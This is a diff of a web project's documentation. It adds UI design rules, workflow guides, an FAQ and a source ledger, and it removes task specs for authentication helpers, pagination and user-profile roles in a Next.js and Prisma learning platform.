+32: - Coordinate between repositories.
+33: - Validate with Zod.
+34: 
+35: ## 5. Create the Server Action
+36: 
+37: - File: `app/[route]/actions.ts`.
+38: - Input validation with Zod.
+39: - Authentication check.
+40: - Call service layer.
+41: - Return typed response.
+42: 
+43: ## 6. Create the UI
+44: 
+45: - Server Component by default.
+46: - Client Component only when required.
+47: - Use shadcn/ui primitives.
+48: - Apply design rules.
+49: 
+50: ## 7. Wire It Together
+51: 
+52: ```
+53: UI Component
+54: ↓
+55: Server Action
+56: ↓
+57: Service
+58: ↓
+59: Repository
+60: ↓
+61: Prisma
+62: ↓
+63: PostgreSQL (Neon)
+64: ```
+65: 
+66: ## 8. Test
+67: 
+68: - Unit tests for service logic.
+69: - Integration tests for actions.
+70: - Component tests for UI.
+71: 
+72: ## 9. Document
+73: 
+74: - Update API documentation.
+75: - Update component inventory.
+76: - Document design decisions.
+77: 
+78: ---
+79: 
+80: # Documentation Rules
+81: 
+82: Every significant change should update the relevant documentation.
+83: 
+84: Architecture decisions should be documented before implementation whenever possible.
+85: 
+86: Documentation should always reflect the current state of the project.
+`````
+
+## File: docs/flows/Redesign First-Audit (Prompt 2).md
+`````markdown
+ 1: # Redesign First-Audit (Prompt 2)
+ 2: 
+ 3: Workflow for redesigning existing interfaces after auditing them.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # Steps
+ 8: 
+ 9: ## 1. Audit the Existing Interface
+10: 
+11: Before changing anything, evaluate:
+12: 
+13: - Run Section 14 pre-flight on the existing page.
+14: - Identify all failed checks.
+15: - Document what works and what does not.
+16: - Check against `docs/rules/AI Tells (Forbidden Patterns).md`.
+17: 
+18: ## 2. Classify the Redesign
+19: 
+20: Choose one mode:
+21: 
+22: ### Preserve Mode
+23: 
+24: - Keep the existing structure.
+25: - Fix specific violations.
+26: - Improve micro-interactions.
+27: - Update typography and spacing.
+28: 
+29: ### Overhaul Mode
+30: 
+31: - Redesign from scratch.
+32: - Keep brand identity and URLs.
+33: - Set new three dials.
+34: - Apply new design direction.
+35: 
+36: ## 3. Never Change Silently
+37: 
+38: - Document every change.
+39: - Explain why each change was made.
+40: - Preserve existing URLs and routes.
+41: - Preserve brand identity unless explicitly told to change.
+42: 
+43: ## 4. Set the Three Dials
+44: 
+45: For the new direction:
+46: 
+47: - Design Variance.
+48: - Motion Intensity.
+49: - Visual Density.
+50: 
+51: ## 5. Build the Redesign
+52: 
+53: - Follow the Greenfield workflow for new elements.
+54: - Respect preserved elements.
+55: - Apply all design rules.
+56: 
+57: ## 6. Run Pre-Flight
+58: 
+59: - Complete Section 14 checklist.
+60: - Verify all checks pass.
+61: - If any check fails, revise and re-check.
+62: 
+63: ## 7. Document Changes
+64: 
+65: - Update all affected documentation.
+66: - Record the redesign decision.
+67: - Update the component inventory.
+68: 
+69: ---
+70: 
+71: # Documentation Rules
+72: 
+73: Every significant change should update the relevant documentation.
+74: 
+75: Architecture decisions should be documented before implementation whenever possible.
+76: 
+77: Documentation should always reflect the current state of the project.
+`````
+
+## File: docs/meta/Tag Taxonomy.md
+`````markdown
+ 1: # Tag Taxonomy
+ 2: 
+ 3: Documentation tag system for categorizing and finding documentation.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # Priority Tags
+ 8: 
+ 9: - `P1` - Priority 1: Rules and Architecture (highest importance).
+10: - `P2` - Priority 2: Workflows and Quality Audits (very high importance).
+11: - `P3` - Priority 3: Concepts and Micro-details (medium importance).
+12: - `P4` - Priority 4: References and Research (low/reference importance).
+13: 
+14: ---
+15: 
+16: # Category Tags
+17: 
+18: - `architecture` - Architecture decisions and patterns.
+19: - `design` - UI/UX design rules and guidelines.
+20: - `quality` - Code quality and testing standards.
+21: - `workflow` - Development workflows and processes.
+22: - `security` - Security rules and practices.
+23: - `performance` - Performance optimization rules.
+24: - `accessibility` - Accessibility standards and guidelines.
+25: 
+26: ---
+27: 
+28: # Technology Tags
+29: 
+30: - `nextjs` - Next.js specific rules.
+31: - `react` - React specific rules.
+32: - `typescript` - TypeScript specific rules.
+33: - `tailwind` - Tailwind CSS specific rules.
+34: - `prisma` - Prisma ORM specific rules.
+35: - `shadcn` - shadcn/ui specific rules.
+36: - `zod` - Zod validation specific rules.
+37: 
+38: ---
+39: 
+40: # Skill Tags
+41: 
+42: - `taste-skill` - Taste Skill framework rules.
+43: - `impeccable` - Impeccable toolchain rules.
+44: - `mifb` - Make Interfaces Feel Better rules.
+45: - `vercel-guidelines` - Vercel web design guidelines.
+46: - `anthropic` - Anthropic frontend design rules.
+47: 
+48: ---
+49: 
+50: # Status Tags
+51: 
+52: - `active` - Currently in use and enforced.
+53: - `draft` - Under development, not yet enforced.
+54: - `deprecated` - No longer recommended.
+55: - `reference` - For reference only, not enforced.
+`````
+
+## File: docs/reference/Questions.md
+`````markdown
+ 1: # Questions
+ 2: 
+ 3: Frequently asked questions about the design skill system.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # General
+ 8: 
+ 9: ## What is the design skill system?
+10: 
+11: A collection of rules, workflows, and tools for building high-quality, intentional UI with AI coding agents.
+12: 
+13: ## Why not just use one skill?
+14: 
+15: Each skill covers different aspects:
+16: 
+17: - Taste Skill: Aesthetic direction.
+18: - Impeccable: Anti-pattern detection.
+19: - MIFB: Micro-interactions.
+20: - Vercel: Accessibility and performance.
+21: - Anthropic: Taste prompting baseline.
+22: 
+23: Using all six provides comprehensive coverage.
+24: 
+25: ## How do I get started?
+26: 
+27: Read `docs/meta/Start Here.md` and `docs/deliverables/Quickstart.md`.
+28: 
+29: ---
+30: 
+31: # Technical
+32: 
+33: ## What are the three dials?
+34: 
+35: Design Variance, Motion Intensity, and Visual Density. They set the aesthetic direction before building.
+36: 
+37: ## What is Section 14?
+38: 
+39: The mandatory pre-flight checklist from Taste Skill. Every box must pass before shipping.
+40: 
+41: ## What is the em-dash ban?
+42: 
+43: A rule from Taste Skill that bans em-dashes and en-dashes in visible text. Use hyphens instead.
+44: 
+45: ---
+46: 
+47: # Process
+48: 
+49: ## When do I run the pre-flight?
+50: 
+51: Before every deliverable. It is mandatory.
+52: 
+53: ## What if skills conflict?
+54: 
+55: Follow the resolution order in `docs/decisions/Enforcement Layer Overlap.md`.
+56: 
+57: ## How do I document decisions?
+58: 
+59: Create a new file in `docs/decisions/` following the existing format.
+`````
+
+## File: docs/reference/Source Ledger.md
+`````markdown
+ 1: # Source Ledger
+ 2: 
+ 3: Evidence-gated source tracking for design rules and claims.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # Schema
+ 8: 
+ 9: Every source entry includes:
+10: 
+11: - `id`: Unique identifier.
+12: - `title`: Source title.
+13: - `url`: Source URL.
+14: - `source_type`: primary, official, supporting, market, practitioner.
+15: - `retrieved`: Date retrieved.
+16: - `refresh_due`: Date for refresh check.
+17: - `confidence`: high, medium, low.
+18: - `claims`: Array of verified claims.
+19: 
+20: ---
+21: 
+22: # Source Types
+23: 
+24: - `official` - Vendor documentation, official sites.
+25: - `primary` - Repository source, canonical skill files.
+26: - `supporting` - Articles, reviews, blog posts.
+27: - `market` - Market snapshots, comparison articles.
+28: - `practitioner` - Independent practitioner work.
+29: 
+30: ---
+31: 
+32: # Current Sources
+33: 
+34: ## Taste Skill v2
+35: 
+36: - Source: Leonxlnx/taste-skill (MIT).
+37: - URL: https://github.com/Leonxlnx/taste-skill.
+38: - Claims: Three dials, Section 14, anti-slop rules, em-dash ban.
+39: - Confidence: high.
+40: 
+41: ## Impeccable
+42: 
+43: - Source: pbakaus/impeccable (Apache-2.0).
+44: - URL: https://github.com/pbakaus/impeccable.
+45: - Claims: 45-rule detector, 23 commands, named anti-slop tells.
+46: - Confidence: high.
+47: 
+48: ## Make Interfaces Feel Better
+49: 
+50: - Source: jakubkrehel/make-interfaces-feel-better.
+51: - URL: https://github.com/jakubkrehel/make-interfaces-feel-better.
+52: - Claims: 16 rule categories, concentric radius, press states, shadow layers.
+53: - Confidence: high.
+54: 
+55: ## Vercel Web Design Guidelines
+56: 
+57: - Source: vercel-labs/web-interface-guidelines (MIT).
+58: - URL: https://github.com/vercel-labs/web-interface-guidelines.
+59: - Claims: 90-110 rules across 16+ categories.
+60: - Confidence: high.
+61: 
+62: ## Anthropic Frontend Design
+63: 
+64: - Source: anthropics/skills (Apache-2.0).
+65: - URL: https://github.com/anthropics/skills.
+66: - Claims: Taste prompting, aesthetic direction, two-pass build-critique.
+67: - Confidence: high.
+68: 
+69: ## UI/UX Pro Max
+70: 
+71: - Source: nextlevelbuilder/ui-ux-pro-max-skill (MIT).
+72: - URL: https://github.com/nextlevelbuilder/ui-ux-pro-max-skill.
+73: - Claims: 67 styles, 161 palettes, 57 font pairs, 99 UX guidelines.
+74: - Confidence: high.
+75: 
+76: ---
+77: 
+78: # Refresh Cadence
+79: 
+80: - On-changelog for skill repos.
+81: - Monthly for rule captures.
+82: - Quarterly for ecosystem coverage.
+83: 
+84: ---
+85: 
+86: # Sources
+87: 
+88: - Gogh source-ledger.json (brainstein/source-ledger@2).
+`````
+
+## File: docs/rules/AI Tells (Forbidden Patterns).md
+`````markdown
+ 1: # AI Tells (Forbidden Patterns)
+ 2: 
+ 3: This document lists UI patterns that signal generic AI-generated output.
+ 4: 
+ 5: These patterns are banned. If you see them, flag and remove immediately.
+ 6: 
+ 7: ---
+ 8: 
+ 9: # Color Tells
+10: 
+11: - Purple-to-blue gradient backgrounds as a default.
+12: - Near-black with acid-green or vermilion accents.
+13: - Warm cream (#F4F1EA) with serif display and terracotta accent.
+14: - Default Tailwind color palette used without customization.
+15: - Multiple accent colors on a single page.
+16: - Random gradient overlays without design justification.
+17: 
+18: ---
+19: 
+20: # Layout Tells
+21: 
+22: - Cards nested inside cards.
+23: - Uniform equal spacing everywhere.
+24: - Perfectly centered hero with no asymmetric element.
+25: - Every section using the same layout family.
+26: - Bento grids with mismatched cell counts.
+27: - Generic "Welcome to Next.js" boilerplate left in production.
+28: - Sections that all look like stacked cards.
+29: 
+30: ---
+31: 
+32: # Typography Tells
+33: 
+34: - Inter used for every project without justification.
+35: - Em-dash (U+2014) or en-dash (U+2013) in visible text.
+36: - No `text-wrap: balance` on headlines.
+37: - No `text-wrap: pretty` on body text.
+38: - Body text exceeding 65ch line length.
+39: - Inconsistent type scale across sections.
+40: 
+41: ---
+42: 
+43: # Interaction Tells
+44: 
+45: - No animation or transition on any interactive element.
+46: - No visible press states on buttons.
+47: - Hit areas smaller than 40x40px.
+48: - Borders used instead of shadows for visual separation.
+49: - Single-layer box-shadow instead of three-layer composition.
+50: - No `prefers-reduced-motion` support.
+51: 
+52: ---
+53: 
+54: # Component Tells
+55: 
+56: - Huge monolithic components.
+57: - Business logic mixed into UI components.
+58: - Database queries inside components.
+59: - Inline styles instead of Tailwind.
+60: - Disabled ESLint or TypeScript rules.
+61: - Unused imports or dead code.
+62: 
+63: ---
+64: 
+65: # Content Tells
+66: 
+67: - Generic placeholder text left in production.
+68: - "Lorem ipsum" or "Your content here."
+69: - Overly verbose hero sections.
+70: - CTAs hidden below the fold.
+71: - Navigation with more than 7 items.
+72: 
+73: ---
+74: 
+75: # How to Use
+76: 
+77: Before shipping any UI, scan against this list.
+78: 
+79: If any tell is found:
+80: 
+81: 1. Identify the root cause.
+82: 2. Apply the fix from `docs/Design Rules.md`.
+83: 3. Document the decision if it conflicts with an existing pattern.
+84: 
+85: ---
+86: 
+87: # Sources
+88: 
+89: Adapted from:
+90: 
+91: - Taste Skill v2 (Leon Lin) - Anti-slop ruleset.
+92: - Impeccable (Paul Bakaus) - 45-rule detector, named anti-slop tells.
+93: - Anthropic frontend-design - Distributional convergence research.
+94: - Vercel web-design-guidelines - Audit layer findings.
+`````
+
+## File: docs/rules/Anthropic Frontend Design Rules.md
+`````markdown
+ 1: # Anthropic Frontend Design Rules
+ 2: 
+ 3: Standards from Anthropic's frontend-design skill for building distinctive, high-quality web interfaces.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # Core Principle
+ 8: 
+ 9: The more aesthetic improvements map to implementable frontend code, the better the output.
+10: 
+11: Design taste is articulable logic, not vibes.
+12: 
+13: ---
+14: 
+15: # Aesthetic Direction
+16: 
+17: Before building, commit to a direction:
+18: 
+19: - Pick a 4-6 value named hex palette.
+20: - Choose one justified aesthetic risk.
+21: - Define a hero thesis (one sentence that captures the page intent).
+22: - Avoid default palettes: warm cream + serif + terracotta, near-black + acid-green, broadsheet hairline-rule layouts.
+23: 
+24: ---
+25: 
+26: # Process
+27: 
+28: Two-pass build-critique:
+29: 
+30: 1. Build the interface with committed direction.
+31: 2. Critique against the design rules. Revise.
+32: 
+33: Never ship on the first pass.
+34: 
+35: ---
+36: 
+37: # Typography
+38: 
+39: - Use `text-wrap: balance` on headlines.
+40: - Use `text-wrap: pretty` on body text.
+41: - Line length: 45-90 characters (max-w-[65ch]).
+42: - Enable font smoothing: `-webkit-font-smoothing: antialiased`.
+43: - Use `font-variant-numeric: tabular-nums` for numeric data.
+44: 
+45: ---
+46: 
+47: # Restraint and Self-Critique
+48: 
+49: - Every element must earn its place.
+50: - If an element does not serve the hero thesis, remove it.
+51: - Default to more whitespace than feels necessary.
+52: - Add density deliberately, not by default.
+53: - Use fewer borders. Prefer shadows, color contrast, and spacing.
+54: 
+55: ---
+56: 
+57: # Writing in Design
+58: 
+59: - Headlines: max 2 lines.
+60: - Subtext: max 20 words.
+61: - CTA visible without scrolling.
+62: - No em-dashes or en-dashes in visible text.
+63: - Body text should feel conversational, not corporate.
+64: 
+65: ---
+66: 
+67: # Anti-Patterns
+68: 
+69: - Inter for everything without justification.
+70: - Purple-to-blue gradients as default.
+71: - Cards nested in cards.
+72: - Uniform equal spacing everywhere.
+73: - Generic AI-generated layouts.
+74: 
+75: ---
+76: 
+77: # Sources
+78: 
+79: - Anthropic frontend-design skill (Apache-2.0).
+80: - Anthropic blog: "Improving frontend design through Skills" (2025-11-12).
+81: - anthropics/skills repository.
+`````
+
+## File: docs/rules/Dark Mode Protocol.md
+`````markdown
+ 1: # Dark Mode Protocol
+ 2: 
+ 3: Rules for implementing and maintaining dark mode across the project.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # Implementation
+ 8: 
+ 9: - Dark mode uses the `.dark` class on the root element.
+10: - Toggle at the layout level, not per component.
+11: - Persist user preference in localStorage.
+12: - Respect `prefers-color-scheme` as the default.
+13: 
+14: ---
+15: 
+16: # Color Tokens
+17: 
+18: - All colors defined as CSS custom properties in `globals.css`.
+19: - Light and dark variants for each token.
+20: - Use oklch color space for perceptually uniform colors.
+21: - Never hardcode color values in components.
+22: 
+23: ---
+24: 
+25: # Background Rules
+26: 
+27: - Never use pure black (#000) for backgrounds.
+28: - Use dark grays (e.g., oklch(0.15 0.01 250)) for surfaces.
+29: - Layer surfaces with subtle lightness differences.
+30: - Use shadows (white at low opacity) for depth in dark mode.
+31: 
+32: ---
+33: 
+34: # Text Rules
+35: 
+36: - Primary text: near-white, not pure white (#FFF).
+37: - Secondary text: medium gray with sufficient contrast.
+38: - Ensure WCAG AA contrast ratios in both modes.
+39: - Never use color alone to convey meaning.
+40: 
+41: ---
+42: 
+43: # Border and Shadow Rules
+44: 
+45: - Borders: use white at 8-12% opacity in dark mode.
+46: - Shadows: compose from three layers (ambient, key, rim).
+47: - Prefer shadows over borders for visual separation.
+48: - Adjust shadow color for dark mode (use lighter shadows).
+49: 
+50: ---
+51: 
+52: # Component Rules
+53: 
+54: - Every component must work in both themes.
+55: - Test all interactive states (hover, focus, active) in both modes.
+56: - Use `cn()` utility for conditional theme classes.
+57: - Never use `dark:` prefix on every property. Use token-based theming.
+58: 
+59: ---
+60: 
+61: # Image Treatment
+62: 
+63: - Image outlines: 1px at 10% opacity (white in dark mode, black in light mode).
+64: - Avoid bright images on dark backgrounds without subtle containment.
+65: - Use `next/image` with `dark:` variants when needed.
+66: 
+67: ---
+68: 
+69: # Documentation Rules
+70: 
+71: Every significant change should update the relevant documentation.
+72: 
+73: Architecture decisions should be documented before implementation whenever possible.
+74: 
+75: Documentation should always reflect the current state of the project.
+`````
+
+## File: docs/rules/Em-Dash Ban.md
+`````markdown
+ 1: # Em-Dash Ban
+ 2: 
+ 3: The em-dash (U+2014) and en-dash (U+2013) are banned anywhere in visible text.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # Rules
+ 8: 
+ 9: - Never use em-dash (U+2014) in visible text.
+10: - Never use en-dash (U+2013) in visible text.
+11: - Use the hyphen (-) for all dash-like purposes.
+12: - Use the math minus sign only in mathematical expressions.
+13: 
+14: ---
+15: 
+16: # Why
+17: 
+18: This rule comes from the Taste Skill framework (Leon Lin).
+19: 
+20: LLMs default to em-dashes and en-dashes because they appear frequently in training data. Banning them forces more deliberate punctuation and breaks the generic AI writing pattern.
+21: 
+22: ---
+23: 
+24: # Examples
+25: 
+26: Incorrect:
+27: 
+28: ```
+29: The feature supports authentication - including OAuth and magic links.
+30: ```
+31: 
+32: Correct:
+33: 
+34: ```
+35: The feature supports authentication - including OAuth and magic links.
+36: ```
+37: 
+38: Incorrect:
+39: 
+40: ```
+41: Our platform offers three tiers - Basic, Pro, and Enterprise.
+42: ```
+43: 
+44: Correct:
+45: 
+46: ```
+47: Our platform offers three tiers - Basic, Pro, and Enterprise.
+48: ```
+49: 
+50: ---
+51: 
+52: # Enforcement
+53: 
+54: - Check all visible text in components.
+55: - Check markdown documentation (internal only).
+56: - Do not check code comments or string literals that are not rendered.
+57: 
+58: ---
+59: 
+60: # Sources
+61: 
+62: - Taste Skill v2 (Leon Lin) - Em-dash and en-dash ban.
+`````
+
+## File: docs/rules/Hero Discipline.md
+`````markdown
+ 1: # Hero Discipline
+ 2: 
+ 3: Rules for building effective hero sections.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # Constraints
+ 8: 
+ 9: - Headline: max 2 lines.
+10: - Subtext: max 20 words.
+11: - CTA visible without scrolling.
+12: - Top padding: max `pt-24`.
+13: - Max 4 text elements in the hero.
+14: 
+15: ---
+16: 
+17: # Structure
+18: 
+19: A hero section contains:
+20: 
+21: 1. Headline (thesis of the page).
+22: 2. Subtext (supporting the headline).
+23: 3. CTA (primary action).
+24: 4. Optional: secondary action or supporting visual.
+25: 
+26: ---
+27: 
+28: # Layout
+29: 
+30: - Hero must be visible above the fold.
+31: - Never hide the CTA below the fold.
+32: - Use `text-wrap: balance` on the headline.
+33: - Use `text-wrap: pretty` on subtext.
+34: - Body text: `max-w-[65ch]`.
+35: 
+36: ---
+37: 
+38: # Anti-Patterns
+39: 
+40: - Hero with more than 4 text elements.
+41: - CTA pushed below the fold by excessive padding.
+42: - Headline that spans more than 2 lines.
+43: - Subtext that exceeds 20 words.
+44: - Hero with no clear visual hierarchy.
+45: - Generic "Welcome to [Framework]" boilerplate.
+46: 
+47: ---
+48: 
+49: # Design Variance
+50: 
+51: - Hero should set the tone for the entire page.
+52: - At least one asymmetric element in the hero.
+53: - Break the grid intentionally.
+54: - Use the three dials to calibrate hero intensity.
+55: 
+56: ---
+57: 
+58: # Sources
+59: 
+60: - Taste Skill v2 (Leon Lin) - Hero constraints and Section 14 pre-flight.
+`````
+
+## File: docs/rules/Taste Skill Color Rules.md
+`````markdown
+ 1: # Taste Skill Color Rules
+ 2: 
+ 3: Color system rules adapted from the Taste Skill framework.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # One Accent Per Page
+ 8: 
+ 9: - Every page has exactly one accent color.
+10: - The accent color is used for CTAs, active states, and highlights.
+11: - Never use multiple accent colors on a single page.
+12: 
+13: ---
+14: 
+15: # Color Palette
+16: 
+17: - Define a 4-6 value named hex palette per project.
+18: - Use oklch color space in `globals.css` for perceptually uniform colors.
+19: - Never use default Tailwind colors without customization.
+20: - Never use purple-to-blue gradients as a default.
+21: 
+22: ---
+23: 
+24: # Banned Palettes
+25: 
+26: - Warm cream (#F4F1EA) with serif display and terracotta accent.
+27: - Near-black with acid-green or vermilion accents.
+28: - Purple-to-blue gradient backgrounds.
+29: - Broad hairline-rule layouts with serif typography.
+30: 
+31: ---
+32: 
+33: # Radius Scale
+34: 
+35: - One radius scale per page.
+36: - Define in `globals.css` via CSS custom properties.
+37: - Concentric radius formula: outer radius = inner radius + padding.
+38: - Never mix radius scales within a page.
+39: 
+40: ---
+41: 
+42: # Theme Locks
+43: 
+44: - One theme (light or dark) per page.
+45: - Switch themes at the layout level, not per component.
+46: - Test both themes before shipping.
+47: 
+48: ---
+49: 
+50: # Token Usage
+51: 
+52: - Always use design tokens from `globals.css`.
+53: - Never hardcode color values in Tailwind classes.
+54: - Update tokens at the source, not in individual components.
+55: 
+56: ---
+57: 
+58: # Sources
+59: 
+60: - Taste Skill v2 (Leon Lin) - Color/Shape/Page-Theme locks.
+61: - W3C Design Tokens Community Group - First stable specification.
+`````
+
+## File: docs/rules/Vercel Interface Rule Categories.md
+`````markdown
+  1: # Vercel Interface Rule Categories
   2: 
-  3: ## Objective
+  3: Performance and accessibility rules adapted from Vercel's web design guidelines.
   4: 
-  5: Harden the existing architectural foundation to support the LMS domain by establishing a lightweight, standardized Server Action response structure (`ActionResult<T>`), session extraction helpers, role verification utilities, and a basic pagination schema—without introducing speculative or generic repository abstractions.
+  5: ---
   6: 
-  7: ---
+  7: # Accessibility
   8: 
-  9: ## Scope
- 10: 
- 11: ### In Scope
- 12: - Lightweight `ActionResult<T>` discriminated union type (`ActionSuccess<T> | ActionFailure`) with basic builder helpers.
- 13: - Server Action authentication helper `requireAuth()` extracting and verifying the active Better Auth session.
- 14: - Server Action role helper `requireRole(roleName)` checking assigned user roles.
- 15: - Standard Zod pagination schema (`page`, `limit`) for clean list queries.
- 16: - Concrete repository error-handling convention (mapping Prisma exceptions to typed `AppError` instances).
+  9: - Icon-only buttons need `aria-label`.
+ 10: - Never use `outline-none` without a focus replacement.
+ 11: - Never block paste on password or input fields.
+ 12: - Honor `prefers-reduced-motion`.
+ 13: - Use semantic HTML elements.
+ 14: - Ensure color contrast meets WCAG AA.
+ 15: 
+ 16: ---
  17: 
- 18: ### Out of Scope
- 19: - Generic or abstract repository base classes (`BaseRepository<T>`, `GenericRepository<T>`, or repository factories).
- 20: - TanStack Query / React Query client caching.
- 21: - External caching infrastructure (Redis/Memcached).
- 22: - Over-engineered authorization DSLs or permission engines.
- 23: 
- 24: ---
- 25: 
- 26: ## Dependencies
- 27: 
- 28: - **Existing Project Dependencies**:
- 29:   - `better-auth`: Session verification (`src/lib/auth.ts`).
- 30:   - `zod`: Schema validation.
- 31:   - `@prisma/client`: Concrete database access and errors (`PrismaClientKnownRequestError`).
- 32:   - `src/lib/errors/`: Existing `AppError` hierarchy (`NotFoundError`, `UnauthorizedError`, `ForbiddenError`, `ValidationError`).
- 33: - **Preceding Tasks**: None (foundation task).
- 34: 
- 35: ---
- 36: 
- 37: ## Architecture Impact
- 38: 
- 39: Establishes a predictable boundary for Server Actions:
- 40: ```
- 41: UI Component
- 42:   ↓ calls
- 43: Server Action (requireAuth(), parse Zod input, call Service, catch errors)
- 44:   ↓ returns
- 45: ActionResult<T> = { success: true, data: T } | { success: false, error: string, code?: string }
- 46: ```
- 47: - Actions remain thin transport adapters.
- 48: - Business logic stays in Services.
- 49: - Repositories remain concrete domain modules (`UserRepository`, `SessionRepository`, etc.).
- 50: 
- 51: ---
- 52: 
- 53: ## Data Model Impact
- 54: 
- 55: No database migrations. Consumes existing Better Auth (`User`, `Session`) and RBAC (`Role`, `Permission`, `UserRole`) models.
- 56: 
- 57: ---
- 58: 
- 59: ## Authorization Rules
- 60: 
- 61: Establishes foundational authentication and role verification primitives:
- 62: 
- 63: ```
- 64: ┌────────────────────────────────────────────────────────┐
- 65: │ 1. Authentication Level                                │
- 66: │    requireAuth() verifies active Better Auth session.  │
- 67: │    Missing/expired session → throws UnauthorizedError  │
- 68: │    or returns actionFailure("UNAUTHORIZED").           │
- 69: └──────────────────────────┬─────────────────────────────┘
- 70:                            │
- 71:                            ▼
- 72: ┌────────────────────────────────────────────────────────┐
- 73: │ 2. Role Level                                          │
- 74: │    requireRole(roleName) verifies caller holds role    │
- 75: │    via AuthorizationService.                           │
- 76: │    Missing role → throws ForbiddenError.               │
- 77: └────────────────────────────────────────────────────────┘
- 78: ```
- 79: *Note: Resource-level ownership (e.g., does Instructor A own Course X?) is enforced strictly inside domain services (Tasks 03–07), not in generic auth helpers.*
- 80: 
- 81: ---
- 82: 
- 83: ## Validation
- 84: 
- 85: - **Pagination Schema** (`src/lib/validations/pagination.ts`):
- 86:   ```typescript
- 87:   export const paginationSchema = z.object({
- 88:     page: z.coerce.number().int().positive().default(1),
- 89:     limit: z.coerce.number().int().positive().max(100).default(12),
- 90:   });
- 91:   export type PaginationInput = z.infer<typeof paginationSchema>;
- 92:   ```
- 93: 
- 94: ---
- 95: 
- 96: ## Error Handling
- 97: 
- 98: - **Error-to-Action Mapping**:
- 99:   - `ValidationError` → code `VALIDATION_ERROR` with field details.
-100:   - `UnauthorizedError` → code `UNAUTHORIZED`.
-101:   - `ForbiddenError` → code `FORBIDDEN`.
-102:   - `NotFoundError` → code `NOT_FOUND`.
-103:   - Unhandled exceptions → logged to Sentry, returns generic message to client without leaking database stack traces.
-104: 
-105: ---
-106: 
-107: ## UI / UX Requirements
-108: 
-109: No user-facing UI in this task. Provides shared utilities consumed by UI components in subsequent tasks.
-110: 
-111: ---
-112: 
-113: ## Testing Strategy
-114: 
-115: - **Unit Tests** (`src/lib/__tests__/action-result.test.ts`):
-116:   - Test `actionSuccess(data)` creates valid `{ success: true, data }`.
-117:   - Test `actionFailure(error, code, details)` creates valid failure payload.
-118: - **Auth Helper Tests** (`src/lib/__tests__/auth-helpers.test.ts`):
-119:   - Test `requireAuth()` succeeds with mock active session.
-120:   - Test `requireAuth()` fails when session is null/expired.
-121:   - Test `requireRole()` allows users with matching role and rejects others.
-122: - **Validation Tests** (`src/lib/validations/__tests__/pagination.test.ts`):
-123:   - Test pagination defaults and boundary values (page 1, limit 12, max limit 100).
-124: 
-125: ---
-126: 
-127: ## Documentation Updates
-128: 
-129: - Document Server Action patterns and `ActionResult<T>` conventions in `docs/Coding Standards.md`.
-130: - Document session extraction in `docs/Authentication.md`.
-131: 
-132: ---
-133: 
-134: ## Acceptance Criteria
-135: 
-136: - [x] `ActionResult<T>` type and builder functions created in `src/lib/action-result.ts`.
-137: - [x] `requireAuth()` and `requireRole()` utilities implemented in `src/lib/auth-helpers.ts`.
-138: - [x] Simple pagination validation schema created in `src/lib/validations/pagination.ts`.
-139: - [x] No generic repository base classes (`BaseRepository<T>`) introduced.
-140: - [x] Unit tests pass cleanly with 100% success rate.
-141: - [x] `pnpm typecheck` and `pnpm lint` pass with zero errors.
-142: 
-143: ---
-144: 
-145: ## Definition of Done
-146: 
-147: - [x] Layered architecture adhered to: Helpers isolated in `src/lib/`.
-148: - [x] Type-safe: Strict TypeScript, zero `any`.
-149: - [x] Validated: Zod parses all helper inputs.
-150: - [x] Authorized: Auth helpers reject unauthenticated/unauthorized callers.
-151: - [x] Tested: Full test suite passes.
-152: - [x] Documented: Coding standards updated.
-153: - [x] Clean quality gate: Passes lint, typecheck, and test checks.
-`````
-
-## File: docs/tasks/02-user-profile-roles.md
-`````markdown
-  1: # Task 02: User Profile & Role Management
-  2: 
-  3: ## Objective
-  4: 
-  5: Extend user identity with LMS profile fields (bio, headline, avatar, website) and establish foundational LMS personas (Student, Instructor, Admin) using the existing RBAC infrastructure, with strict self-ownership enforcement preventing unauthorized profile modifications or privilege escalation.
-  6: 
-  7: ---
-  8: 
-  9: ## Scope
- 10: 
- 11: ### In Scope
- 12: - Extending the `User` model with profile fields (`headline`, `bio`, `avatarUrl`, `website`).
- 13: - Seeding default LMS roles (`student`, `instructor`, `admin`) and baseline role assignment permission (`roles:assign`, granted to `admin`). Speculative future permissions (`course:*`, `lesson:*`) pruned to avoid premature domain leakage ahead of Tasks 03–06.
- 14: - Concrete `UserRepository` method for profile updates (`updateUserProfile`). Speculative `findInstructors` query removed.
- 15: - `ProfileService` enforcing strict self-ownership on profile modifications.
- 16: - `AuthorizationService` managing role assignments with admin-only authorization.
- 17: - Server Actions for profile retrieval and updating (`getProfileAction`, `updateProfileAction`).
- 18: - User profile settings form built with React Hook Form, official `@hookform/resolvers/zod`, and shadcn/ui.
+ 18: # Focus Management
  19: 
- 20: ### Out of Scope
- 21: - Social features (follow/unfollow, friend connections, activity feeds).
- 22: - Public profile vanity URLs or custom domain mapping.
- 23: - Complex instructor verification / KYC processes.
- 24: - Multi-tenancy or organization memberships (pure individual user ownership).
- 25: - Speculative course or lesson queries prior to Tasks 03–06.
- 26: 
- 27: ---
- 28: 
- 29: ## Dependencies
- 30: 
- 31: - **Preceding Tasks**:
- 32:   - `Task 01`: `ActionResult<T>`, `requireAuth()`, and error-handling utilities.
- 33: - **Packages**:
- 34:   - `better-auth`, `@prisma/client`, `react-hook-form`, `@hookform/resolvers`, `zod`, `lucide-react`.
- 35: 
- 36: ---
- 37: 
- 38: ## Architecture Impact
- 39: 
- 40: Follows strict layering:
- 41: ```
- 42: Profile Settings Form (Client Component)
- 43:   ↓ calls
- 44: updateProfileAction (src/actions/profile.ts: requireAuth(), Zod parse)
- 45:   ↓ calls
- 46: ProfileService (src/services/profile.ts: asserts session.userId === targetUserId)
- 47:   ↓ calls
- 48: UserRepository (src/repositories/user.ts: concrete Prisma queries)
- 49:   ↓ updates
- 50: PostgreSQL Database
- 51: ```
- 52: 
- 53: ---
- 54: 
- 55: ## Data Model Impact
- 56: 
- 57: ```prisma
- 58: model User {
- 59:   // Existing Better Auth fields
- 60:   id            String     @id @default(cuid())
- 61:   email         String     @unique
- 62:   name          String?
- 63:   emailVerified Boolean    @default(false)
- 64:   image         String?
- 65:   createdAt     DateTime   @default(now())
